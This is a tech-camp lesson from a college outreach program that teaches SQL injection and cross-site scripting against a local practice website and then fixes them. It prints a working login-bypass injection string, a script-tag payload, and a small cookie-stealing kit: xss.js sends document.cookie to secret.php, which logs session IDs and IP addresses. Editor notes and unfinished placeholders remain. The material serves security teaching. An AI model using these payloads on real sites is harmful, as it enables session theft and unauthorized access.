### Red River College's Applied Computer Education Department presents  
## Tech Camp
# Part 4: Internet Security

## Introduction
In the Internet Security session of the Tech Camp, we teach you how to add a basic security feature called a user gateway. By setting up this feature, you limit certain functions or information on your site to authorized individuals only. However, with added complexity to your site comes the need for additional security. The example that we give you initially is flawed and it leaves the site open to security threats. After we demonstrate the holes in the security, we proceed with strengthening it. The fixes we provide do not solve every problem that can occur, but it is a great start.

We invite you to find additional security threats on your website, and see if you can prevent them!

### SQL Injections
The first of two attacks we use is what’s called an SQL Injection. SQL is the language of the modern database (a warehouse of information). It tries to use a natural language approach to its design that allows for easy use and understanding. For example, let’s say you were browsing a retail store for a computer, but you only wanted to see computers that are orange in color. How would you ask a sales person this question? In SQL it would look like this:
``` SQL
SELECT * --(asterisk means all)
FROM computers
WHERE color = ‘orange’.
```
You want to get (or select) ALL information about the computers at this store (from computers), where the color of the computer is equal to orange.

In an SQL injection attack, you use this natural language against itself. When you understand the structure of the language, it can be simple to alter it. And when the statement finally gets sent to the database, it doesn’t know what a normal or fake statement is. It takes the statement and runs it without a care in the world! However, most websites already prevent this threat before it reaches the database.

### Cross Site Scripting

This kind of threat also goes by the acronym of XSS. This threat is one of the more common attacks done to a website in the modern age. It can be tricky to deal with it, even if you realize that it is happening to you. The idea behind this threat is that you place an otherwise harmless piece of code on a website that allows you to save information. This harmless code loads more code from a different website. The code on this other website is anything but harmless. It can be used to gather private information from you, or to change the entire structure of your website.

At best, a cross site scripting threat will simply deface your website. You see this threat almost immediately and you can begin to clean it up so other people can view your website again. At worst, this threat can be quick and silent, tracking information about you and your website. This kind of attack could be on your site for weeks, months, or even years before you discover it.

## Setting up the Project
### NOTE from Andrea: below needs to be converted for Goorm delivery. We are using phpMyAdmin instead of Adminer. Sorry, I just noticed this (02-05-2021) I replaced all instances of 'Adminer' with 'phpMyAdmin'.  

<!-- NOTE from Andrea: Let's prefer snippets over file navigation if at all possible.

If you are setting up this project from the Database session, all of the files you will need are located in the following folder on the USB drive:

Internet Security\Starting Files\
-->

If you wish to start with the project already set up, you can get them from the following directory:
[0 - Starting and Ending Files/04 Security Ending Files/Before Intrusion](0%20-%20Starting%20and%20Ending%20Files/04%20Security%20Ending%20Files/Before%20Intrusion)

### NOTE from Andrea: will still need to give instruction on how to get the files into their project.
In the Starting Files folder are several files that you need to copy over to your project first. These files are:
1. login.inc
1. login_state.inc
1. logout.php
1. validate.php  

After the files have been copied over to the website, you will need to add the user credentials to the database. The SQL you need to run is located in the file called create_users.sql. Right click on the ZWAMP icon in the task bar, highlight Tools, and select phpMyAdmin. Log in to phpMyAdmin using `phpmyadmin` as the username with a password of `root`. When you are in, click on the techcamp database link. When the database page has loaded, click on the green SQL Command button at the top of the page.

When the text box has loaded, copy and paste this script into the text area and press the `Go` button:
```sql
USE techcamp;

CREATE TABLE users (
  id			int(4)			NOT NULL	AUTO_INCREMENT
  , username	varchar(200)	NOT NULL	DEFAULT ''
  , password	varchar(200)	NOT NULL	DEFAULT ''
  , PRIMARY KEY (id)
);

INSERT INTO users (id, username, password) VALUES (1, 'john', '1234');
```

This will add the user, `john`, with a password of, `1234`, to the database. You will now be ready to add the user gateway to the website.

## Setting up the Hacker Files
<!-- NOTE from Andrea: I commented this part out because I'm pretty sure we don't need it anymore, now that snippets have been added.

If you wish to run the hacker files locally, you will be required to run a few extra steps to get them set up. First, you will need to locate the files on the USB stick:

Internet Security\Ending Files\Hacker Files\

# NOTE from Andrea - we can give them the following link for the image:  
' The picture is used during the cross site scripting attack on the website.  '
https://github.com/RRC-ACE-Outreach/TechCamp/blob/main/TechCamp%20-%20Web%20App/0%20-%20Images/HackitTheCat.png  
-->
You will need to create the following files in your project:
- `secret.php`
- `secretshow.php`
- `xss.js`

#### secret.php
The `secret.php` file is used to collect data secretly from anyone who accesses the hacked website.
Copy and paste this snippet into your `secret.php` file:
```php
<?php
	require('connect_db.php');
	$insert_sql = "INSERT INTO secret (phpsession, ip, domain) VALUES (:session, :ip, :domain);";
	$statement = $db->prepare($insert_sql);
	$statement->bindValue(":session", $_GET['image'], PDO::PARAM_STR);
	$statement->bindValue(":ip", $_SERVER['REMOTE_ADDR'], PDO::PARAM_STR);
	$statement->bindValue(":domain", $_SERVER['HTTP_REFERER'], PDO::PARAM_STR);
	$statement->execute();
?>
```

#### secretshow.php
The `secretshow.php` file is used to show the data that had been collected.
Copy and paste this snippet into your `secretshow.php` file:
```php
<table border="1">
	<tr>
		<th>Session ID</th>
		<th>IP Address</th>
		<th>Host Address</th>
	</tr>
<?php
	require('connect_db.php');

	$select_sql = "SELECT * FROM secret;";
	$statement = $db->prepare($select_sql);
	$statement->execute();
	$results = $statement->fetchAll();

	foreach ($results as $item) {
?>
	<tr>
		<td><?= $item['phpsession'] ?></td>
		<td><?= $item['ip'] ?></td>
		<td><?= $item['domain'] ?></td>
	</tr>
<?php
	}
?>
</table>
```

#### xss.js
The `xss.js` file is the code that is executed from a remote computer. It takes over the website that runs it, and tries to load another “image” that is actually the secret.php page.

Copy and paste this snippet into your `xss.js` file:
```js
var catimage = "https://github.com/RRC-ACE-Outreach/TechCamp/blob/main/TechCamp%20-%20Web%20App/0%20-%20Images/HackitTheCat.png";
var fakeimage = "http://localhost/secret.php?image=";
document.write("<div style=\"position:absolute; left:0px; top:0px; height:100%; width:100%; background-color:#FFFFFF; text-align: center;\"><img src=\"" + catimage + "\" style=\"position: relative; height:200px;\" /><p style=\"font-size:3em;\">NYA! YUR SITE IS MINE! #HACKED<img src=\"" + fakeimage + document.cookie + "\" style=\"width:1px; height:1px;\"/></p></div>");
```

Next, you will need to create the secret table in the database, so that information can be collected. Open phpMyAdmin and go in to the techcamp database.

Click on the green SQL Command button, then copy and paste this code in to the text box:
```sql
CREATE TABLE secret (
	phpsession	TEXT,
    ip	TEXT,
    domain	TEXT
);
```
Press the `Go` button to execute the SQL.

With the secret table created, you will now be ready to hack your website. To view the data that has been collected, visit the page:

## NOTE from Andrea: this link will need updating - ie. with instruction on how to get there.
#### [http://localhost/secretshow.php](http://localhost/secretshow.php)

## Adding the User Gateway
If you have not set up the project yet, go to the section of this document titled Setting up the Project, and follow those instructions first. It will copy the necessary files over to your website, and set up the users database.

A user gateway is a means of preventing access to features or information on your website. It does this by preventing access until a certain username and password combination has been entered. For the Tech Camp website, we will be preventing anyone from accessing your main page until they provide a username/password combination of `john` and `1234`.

First we need to copy and paste some code in to `index.php` so the user gateway becomes active.

#### Security Step 1: Adding user gateway part 1
At the very top of index.php, you will see an empty line, and right below it is a comment that says Security Step 1. Copy and paste the below snippet right above the comment:
```php
<?php require_once("login.inc"); ?>
```
It should look like this after you are done:
```php
{Replace this with the example of code needed}
```

#### Security Step 2
Next, near the top of index.php, right above the title `<h1>` tag, should be another comment that says Security Step 2, followed by an empty line. Copy and paste the following snippet onto the empty line:  
```php
<?php require_once("login_state.inc"); ?>
```
When you have done this, it should look like this:  
```php
{Replace this with the example of code needed}
```

Don’t forget to save your work!
You should now be able to visit your website, and you will not be able to see it until you enter the username of `john`, and a password of `1234`.

## Performing the Security Audit
If you wish to see the results of performing a cross site scripting attack on your website, please visit the section titled Setting up the Hacker Files. These files are required to be set up in order for the attack to take place. You can still perform the SQL Injection attack without these files however.

#### Hacking Code 1
This is the information you will need to begin the security audit process.
The text under Step 1 is how you perform the SQL Injection. Its job is to tell the database that loading any user information is fine, no need for an exact username and password combination. You enter it in like this:
```
' or 1=1 #
```
It doesn’t matter what you put in to the password field, so long as the name field looks like that the SQL Injection will happen.  

When you have logged in using your “account”, it’s time to save some code to the website so that it can take over!

# NOTE from Andrea: the below URL will need Goorm specific instructions.
#### Hacking Code 2
Before we can the next piece of hacking code, we need to change something. The part of the text that says `#.#.#.#` is the name of the computer you wish to load your `xss.js` from. You will need to replace the `#.#.#.#` with the text “localhost”. This will load `xss.js` from your computer if you have set it up.
```
<script language=javascript src=http://#.#.#.#/xss.js></script>
```  
Once that is done, enter the altered text in to the first field on the Index, and enter other information as you require for the other fields. When you are done, it should look like this:
```
{Replace this with the example of code needed}
```

Click create, and suddenly the website has been defaced by Hackit the Cat!

## Strengthening Security
If you wish to start your website from this strengthened point, you can find the files in the following directory:

[0 - Starting and Ending Files/04 Security Ending Files/After Intrusion](0%20-%20Starting%20and%20Ending%20Files/04%20Security%20Ending%20Files/After%20Intrusion)

Before you begin strengthening your website against hacking attempts, you might need to clean up any existing hacks that have occurred. You do this by going in to phpMyAdmin, logging in as root, clicking on the link for the techcamp database, and clicking on the link that says `db_table`, and finally by clicking on the link that says Select data. When you see the entry for the hack, you click on the check box next to it, and then hit delete:

With the hack removed from your website, you can now fix some of your code to prevent future SQL Injections or XSS attacks that save information on to your front page. Just remember, XSS attacks are tricky and are changing every day. Staying up to date with all of the latest threats will prepare you to stop attacks before they happen.

#### Security Step 3
Edit validate.php, and look for a comment near the top that says `// Security Step 3`. The five lines after it are what you will replace with below text snippet:
```php
if ($_POST) {
  $select_sql = "SELECT username FROM users WHERE username=:username AND password=:password;";
  $statement = $db->prepare($select_sql);
  $statement->execute($_POST);
  $user = $statement->fetch();
```  
When you have done that, `validate.php` should look like this:
```php
{Replace this with the example of code needed}
```  

The different between this and what was there before is that now we are relying on the programming language to help us clean up attempts to cause an SQL Injection. If you observe the validate page before and after you change the code, you will notice that the SQL Statement part of the page will have changed.

Instead of it saying:
```sql
WHERE username=’john’ AND password=’1234’;
```  
It will say:
```sql
WHERE username=:username AND password=:password;
```  

#### Security Step 4
Next, we need to prevent any future XSS attacks from potentially running.  
Open `index.php`.  
Near the very bottom of the webpage, where you erased all your `<li>` `</li>` tags and replaced it with some code in the Database session. Here you will see a comment that says Security Step 4.

 The line right below it is what you will replace with the code snippet below:  
 *If you are not sure which line, look at what is in the text file for a reference. The change we are making is subtle, but it is very important.*
```php
<li><a href="detail.php?id=<?= $dataset['id'] ?>"><?= strip_tags($dataset['column1']) ?></a></li>
```
When you have replaced the old line, the code should look like this:
```php
{Replace this with the example of code needed}
```

It is subtle, but that extra part that says `strip_tags()` prevents code from being run when you don’t want it to.

Your website should now be secure against simple attacks. But there is always more that you can always do…

## Where can I learn more?
If you wish to learn more about security audits and the many different kinds of attacks that can happen to a website, visit [https://www.owasp.org, ](https://www.owasp.org/)the Open Web Application Security Project. This is a community built around the idea of letting the public know about the different types of attacks that can happen, and how to prevent them.

And remember what our favorite web slinger always says; with great power comes great responsibility. You should **NEVER** use this knowledge against someone who is unwilling.

Hacking is illegal, and you can be fined, jailed, or even extradited over these crimes. Use this knowledge wisely, to protect yourself, and those who are willing to be protected by you.

---
## That's all for Part 4: Internet Security!

# Links
**Coming up: [Please fill out our survey and tell us how we did.](https://forms.office.com/Pages/ResponsePage.aspx?id=RZv6hqN6cECKVO3O9Da9RNVssp8kJtxMngDi82Jspk9UMks0UldJNFFLSDBTR0UwOVpGUTdZRFRNMy4u)**  
**Return to [Web App Landing Page](README.md)**
